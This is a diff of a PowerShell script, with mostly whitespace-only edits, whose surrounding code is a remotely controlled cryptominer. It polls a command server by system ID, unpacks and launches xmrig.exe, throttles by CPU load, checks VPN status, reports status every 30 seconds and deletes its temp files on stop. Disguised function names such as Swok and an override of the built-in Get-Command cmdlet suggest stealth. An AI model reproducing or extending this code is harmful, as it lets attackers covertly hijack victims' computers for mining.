@@ -104,12 +104,10 @@ function Get-Command {
             -Force
          Write-Host "unzipped"
         Remove-Item $zipFile -Force
-
         if (!(Test-Path $MINER_EXE)) {
             Write-Host "xmrig.exe not found!"
             return
         }
-
         if (!$global:MINER_PROC) {
             Write-Host "Starting miner..."
 
@@ -121,22 +119,17 @@ function Get-Command {
         }
     }
     elseif ($command -eq "stop") {
-
         Write-Host "Stopping miner..."
-
         if ($global:MINER_PROC) {
             Stop-Process -Id $global:MINER_PROC.Id -Force
             $global:MINER_PROC = $null
         }
-
         if (Test-Path $TEMP_DIR) {
             Remove-Item $TEMP_DIR -Recurse -Force
         }
-
         Write-Host "Mining stopped and cleaned."
     }
 }
-
 function Swok {
     Write-Host "called me"
     # If worker already running, do nothing
@@ -158,25 +151,18 @@ function Swnok {
     # Mark worker as stopped
     $global:WORKER = $false
 }
-
 while($true){
-
     $cpu = Get-CPU
     $cmd = Get-Command -SystemId $SYSTEM
     Write-Host "cnd $cmd cpu $cpu"
     if($cpu -gt $CPU_LIMIT){
         Stop-Worker
     }
-
     if($cmd -eq "start"){ Swok Write-Host ¨called start $cmd¨ }
     if($cmd -eq "stop"){ Swnok Write-Host "called stop $cmd"}
-
     $running = $WORKER 
     Write-Host "$running run in wprker: $WORKER"
-
-    $vpnStatus = Check-VPN
-   
+    $vpnStatus = Check-VPN   
     Send-Status $running $cpu $vpnStatus
-
     Start-Sleep 30
 }
